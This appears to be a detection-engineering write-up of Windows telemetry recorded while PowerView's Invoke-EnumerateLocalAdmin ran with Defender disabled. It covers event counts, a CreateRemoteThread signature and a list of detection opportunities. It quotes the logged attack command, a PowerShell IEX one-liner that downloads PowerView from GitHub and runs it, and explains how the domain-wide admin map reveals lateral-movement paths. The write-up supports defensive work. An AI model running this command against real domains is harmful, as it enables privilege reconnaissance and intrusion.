# T1069.002-5: Domain Groups — Find Local Admins on All Machines in Domain (PowerView)

## Technique Context

T1069.002 (Domain Groups) with PowerView's `Invoke-EnumerateLocalAdmin` extends local admin discovery to the broadest possible scope: enumerate the local administrator group membership on every domain-joined computer. Where `Find-LocalAdminAccess` (T1069.002-4) tests whether the current user has access to each machine, `Invoke-EnumerateLocalAdmin` interrogates the local Administrators group on every domain computer to retrieve a full roster of who has admin rights where. The result is a comprehensive map of privilege distribution across the entire domain.

This technique is particularly valuable for identifying lateral movement paths that the current account cannot directly exploit — an attacker might find that a service account with known credentials is a local admin on a critical server, or discover that a shared admin account provides access to multiple machines. The enumeration requires making SAMR (Security Account Manager Remote Protocol) calls to each domain-joined computer, generating substantial network traffic. Detection focuses on the download and execution of PowerView, the specific function name in logs, and the high-volume outbound network connections characteristic of a sweep across all domain computers.

In the defended version, Defender blocked execution. With Defender disabled, PowerView fully executes.

## What This Dataset Contains

Security EID 4688 captures the full attack command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin -Verbose}
```

The same pinned PowerView commit hash as T1069.002-4. The cleanup process (`"powershell.exe" & {}`) confirms execution completion. A third EID 4688 event records a second `whoami.exe` execution by the cleanup test framework.

Sysmon provides 23 events: 14 EID 7 (image load), 3 EID 1 (process create), 3 EID 10 (process access), 2 EID 17 (pipe create), and 1 EID 8 (CreateRemoteThread). The EID 8 CreateRemoteThread event shows `powershell.exe` (PID 6524) creating a thread in `<unknown process>` (PID 1812, NewThreadId 6236) at `StartAddress: 0x00007FF77E8753A0` — the same consistent PowerView signature address as T1069.002-4, T1069.002-6, T1069.002-12, and T1069.002-13. This address appears across every PowerView test in this batch, making it a reliable behavioral fingerprint for this PowerView build.

The EID 7 image loads document the standard .NET CLR initialization chain (`mscoree.dll`, `mscoreei.dll`, `clr.dll`). Two named pipe creation events (EID 17) record the PowerShell host pipes. The three EID 1 events cover the two whoami.exe test framework checks and the main PowerShell execution.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103), matching the pattern for all PowerView tests in this batch.

Compared to the defended version (25 sysmon, 9 security, 41 PowerShell events), the undefended run shows comparable sysmon events (23 vs 25), fewer security events (4 vs 9 — the defended run includes the ACCESS_DENIED termination), and more PowerShell events (96 vs 41), confirming PowerView script execution.

## What This Dataset Does Not Contain

Network connection telemetry is absent from the samples. `Invoke-EnumerateLocalAdmin` is one of the noisiest PowerView functions from a network perspective — it makes SAMR calls to every domain computer. The absence of EID 3 network connection events in the samples significantly understates the attack's network footprint. The actual enumeration results (admin group members on each domain computer) are not captured.

The EID 8 CreateRemoteThread target remains `<unknown process>`, limiting forensic attribution of what was injected into which process.

## Assessment

This dataset, combined with T1069.002-4, T1069.002-6, T1069.002-12, and T1069.002-13, establishes a consistent PowerView behavioral profile. The `Invoke-EnumerateLocalAdmin` function is among the most network-intensive PowerView operations; in the full dataset (not just samples), network connection events almost certainly exist and would show the breadth of the enumeration sweep. The command line evidence is high-fidelity, and the EID 8 CreateRemoteThread signature at the consistent start address ties this to the PowerView toolset.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 — `Invoke-EnumerateLocalAdmin -Verbose` in command line**: The function name is specific to PowerView (it does not exist in any native Windows tooling or commonly-used legitimate frameworks). Its presence in a process command line is an unambiguous indicator.

2. **Sysmon EID 8 — CreateRemoteThread at `0x00007FF77E8753A0` from PowerShell**: Confirmed across five PowerView tests (T1069.002-4, -5, -6, -12, -13). This is the most consistent single-event PowerView execution signature in this entire batch.

3. **Sysmon EID 17 — two named pipes from PowerShell**: When two PSHost pipes are created in quick succession with different PID-embedded names, they confirm a parent PowerShell (test framework) spawning a child PowerShell (technique runner). The timing proximity of pipe creation and the EID 8 artifact links them to the same execution chain.

4. **EID 4104 — `Invoke-EnumerateLocalAdmin` function definition or execution**: Script block logging captures PowerView function definitions. The presence of `Invoke-EnumerateLocalAdmin` in any script block log event is a high-confidence PowerView indicator.

5. **High-volume outbound SMB connections from workstation**: While not captured in this sample, `Invoke-EnumerateLocalAdmin` sweeps all domain computers via SAMR. Detecting a workstation initiating rapid sequential connections on port 445 to multiple hosts in the domain, following a PowerShell execution, is a strong behavioral signal for this specific function.
